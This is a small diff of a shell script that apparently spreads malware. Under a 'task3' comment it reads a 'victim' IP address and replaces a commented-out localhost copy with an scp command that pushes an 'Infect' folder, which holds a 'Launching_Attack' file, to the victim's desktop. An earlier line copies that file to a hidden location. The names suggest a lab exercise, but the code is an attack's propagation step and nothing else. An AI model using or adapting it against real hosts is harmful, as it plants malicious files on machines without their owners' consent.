@@ -18,6 +18,4 @@ cp ./Infect/Launching_Attack $Hidden2
 # task3
 # input victim's IP address
 read -p "Enter Victim IP Address: " IP_Address
-echo "IP $IP_Address"
-
-# scp -r ./Infect victim@127.0.0.1:/home/victim/Desktop/
+scp -r ./Infect victim@"$IP_Address":/home/victim/Desktop/
